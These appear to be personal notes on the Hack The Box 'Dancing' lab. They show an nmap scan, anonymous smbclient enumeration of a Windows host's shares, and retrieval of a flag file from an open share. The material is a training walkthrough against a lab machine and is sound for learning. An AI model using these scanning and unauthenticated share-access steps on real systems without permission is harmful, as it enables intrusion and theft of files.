# Security Exercises 

### openpgp for cryptographic key sharing on linux kernel

### Hackthebox -Starting-point-Dancing exercise

`nmap -sV 10.129.110.188`

nmap command shows services running on respective ports
```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-01 18:16 CET
Nmap scan report for 10.129.110.188
Host is up (0.030s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.70 seconds
```

smb refers to server message block, a common client server communication protocol 
You can use smbclient to access the smb share
Use help command to see command usage
`smbclient -h`

```bash
Usage: smbclient [-?EgqBNPkV] [-?|--help] [--usage] [-M|--message=HOST]
        [-I|--ip-address=IP] [-E|--stderr] [-L|--list=HOST] [-T|--tar=<c|x>IXFvgbNan]
        [-D|--directory=DIR] [-c|--command=STRING] [-b|--send-buffer=BYTES]
        [-t|--timeout=SECONDS] [-p|--port=PORT] [-g|--grepable] [-q|--quiet]
        [-B|--browse] [-d|--debuglevel=DEBUGLEVEL] [--debug-stdout]
        [-s|--configfile=CONFIGFILE] [--option=name=value]
        [-l|--log-basename=LOGFILEBASE] [--leak-report] [--leak-report-full]
        [-R|--name-resolve=NAME-RESOLVE-ORDER] [-O|--socket-options=SOCKETOPTIONS]
        [-m|--max-protocol=MAXPROTOCOL] [-n|--netbiosname=NETBIOSNAME]
        [--netbios-scope=SCOPE] [-W|--workgroup=WORKGROUP] [--realm=REALM]
        [-U|--user=[DOMAIN/]USERNAME[%PASSWORD]] [-N|--no-pass] [--password=STRING]
        [--pw-nt-hash] [-A|--authentication-file=FILE] [-P|--machine-pass]
        [--simple-bind-dn=DN] [--use-kerberos=desired|required|off]
        [--use-krb5-ccache=CCACHE] [--use-winbind-ccache]
        [--client-protection=sign|encrypt|off] [-k|--kerberos] [-V|--version]
        [OPTIONS] service <password>
```


Use smbclient command to connect to ip address of target machine given on hackthebox
`sudo smbclient -L 10.129.110.188`

```bash

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk  
```

use command to get into disk
`smbclient \\\\10.129.110.188\\Workshares`

you're inside! now look around and capture the flag
```bash
smb: \> ls
  .                                   D        0  Mon Mar 29 10:22:01 2021
  ..                                  D        0  Mon Mar 29 10:22:01 2021
  Amy.J                               D        0  Mon Mar 29 11:08:24 2021
  James.P                             D        0  Thu Jun  3 10:38:03 2021

                5114111 blocks of size 4096. 1751194 blocks available
smb: \> cd Amy.J
smb: \Amy.J\> ls
  .                                   D        0  Mon Mar 29 11:08:24 2021
  ..                                  D        0  Mon Mar 29 11:08:24 2021
  worknotes.txt                       A       94  Fri Mar 26 12:00:37 2021

                5114111 blocks of size 4096. 1751178 blocks available
smb: \Amy.J\> 
smb: \Amy.J\> Amy.j
Amy.j: command not found
smb: \Amy.J\> cd /
smb: \> cd James.P
smb: \James.P\> ls
  .                                   D        0  Thu Jun  3 10:38:03 2021
  ..                                  D        0  Thu Jun  3 10:38:03 2021
  flag.txt                            A       32  Mon Mar 29 11:26:57 2021

                5114111 blocks of size 4096. 1751178 blocks available
smb: \James.P\> get flag.txt
getting file \James.P\flag.txt of size 32 as flag.txt (0,2 KiloBytes/sec) (average 0,2 KiloBytes/sec)
```
